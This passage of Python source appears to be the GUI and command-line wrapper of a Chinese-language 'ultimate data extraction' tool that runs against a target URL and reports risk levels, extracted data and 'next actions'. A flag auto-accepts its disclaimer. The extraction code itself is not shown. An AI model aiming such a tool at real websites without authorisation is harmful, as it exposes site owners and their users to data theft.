        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, f"开始对 {target_url} 进行数据提取...\n")

        # 在后台线程中执行提取
        extraction_thread = threading.Thread(target=self.perform_extraction_gui, args=(target_url,))
        extraction_thread.daemon = True
        extraction_thread.start()

    def perform_extraction_gui(self, target_url):
        """执行提取任务（GUI模式）"""
        try:
            self.status_text.config(text="正在执行提取...", foreground="orange")
            self.progress_bar['value'] = 0

            # 执行提取
            extraction_result = self.perform_comprehensive_extraction(target_url)

            # 更新进度
            self.progress_bar['value'] = 100

            # 显示结果
            self.display_extraction_result(extraction_result)

            # 更新状态
            self.status_text.config(text="提取完成", foreground="green")

        except Exception as e:
            self.status_text.config(text=f"提取失败: {str(e)}", foreground="red")
            self.result_text.insert(tk.END, f"错误: {str(e)}\n")

        finally:
            # 启用开始按钮
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def display_extraction_result(self, extraction_result):
        """显示提取结果"""
        result_text = f"目标: {extraction_result['target_url']}\n"
        result_text += f"风险等级: {extraction_result['risk_assessment']}\n"
        result_text += f"总提取次数: {extraction_result['total_data_extracted']}\n"
        result_text += f"成功率: {extraction_result['success_rate']}%\n\n"

        result_text += "=== 提取详情 ===\n"
        for i, extraction in enumerate(extraction_result['extractions'], 1):
            result_text += f"\n提取 #{i}:\n"
            result_text += f"  类型: {extraction['type']}\n"
            result_text += f"  方法: {extraction['method']}\n"
            result_text += f"  数据类型: {extraction['data_type']}\n"
            result_text += f"  描述: {extraction['description']}\n"
            if extraction.get('success', False):
                result_text += f"  状态: [成功]\n"
                result_text += f"  提取的数据: {extraction['extracted_data']}\n"
            else:
                result_text += f"  状态: [失败]\n"

        result_text += f"\n=== 下一步行动 ===\n"
        for action in extraction_result['next_actions']:
            result_text += f"  - {action}\n"

        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, result_text)

    def stop_extraction(self):
        """停止提取"""
        self.status_text.config(text="正在停止...", foreground="orange")
        # 实际停止逻辑需要根据具体实现添加

    def clear_results(self):
        """清除结果"""
        self.result_text.delete(1.0, tk.END)
        self.progress_bar['value'] = 0
        self.status_text.config(text="就绪", foreground="green")

    def export_data_gui(self):
        """导出数据（GUI模式）"""
        if not self.extracted_data:
            messagebox.showwarning("警告", "没有可导出的数据！")
            return

        file_type = self.output_format.get().lower()
        filename = self.export_data(file_type)
        if filename:
            messagebox.showinfo("成功", f"数据导出成功: {filename}")
        else:
            messagebox.showerror("错误", "数据导出失败！")

    def generate_report_gui(self):
        """生成报告（GUI模式）"""
        if not self.extracted_data:
            messagebox.showwarning("警告", "没有可生成报告的数据！")
            return

        messagebox.showinfo("信息", "报告生成需要完整的提取结果。请在执行提取后重试。")

    def on_closing(self):
        """关闭窗口"""
        if messagebox.askokcancel("退出", "确定要退出吗？"):
            self.root.destroy()

    def run_gui(self):
        """运行GUI界面"""
        self.create_gui()
        self.root.mainloop()

    def run(self):
        """运行工具"""
        if self.gui_mode:
            self.run_gui()
        else:
            self.run_cli_interface()

def main():
    """主函数"""
    import argparse

    parser = argparse.ArgumentParser(description='Dragon-V 终极数据提取工具')
    parser.add_argument('--gui', action='store_true', help='启动GUI界面')
    parser.add_argument('--target', type=str, help='目标URL')
    parser.add_argument('--disclaimer', action='store_true', help='自动接受免责声明')

    args = parser.parse_args()

    # 创建工具实例
    extractor = UltimateDataExtractor(gui_mode=args.gui)

    # 如果需要自动接受免责声明
    if args.disclaimer:
        extractor.disclaimer_accepted = True

    if args.target:
        # 直接执行提取
        if not extractor.show_disclaimer():
            print("必须接受免责声明才能继续。")
            return

        result = extractor.perform_comprehensive_extraction(args.target)
        print("提取完成！")

        # 导出数据
        filename = extractor.export_data()
        if filename:
            print(f"数据导出成功: {filename}")

        # 生成报告
        report_filename = extractor.create_comprehensive_report([result])
        print(f"报告生成成功: {report_filename}")

    else:
        # 交互式界面
        extractor.run()

if __name__ == "__main__":
    main()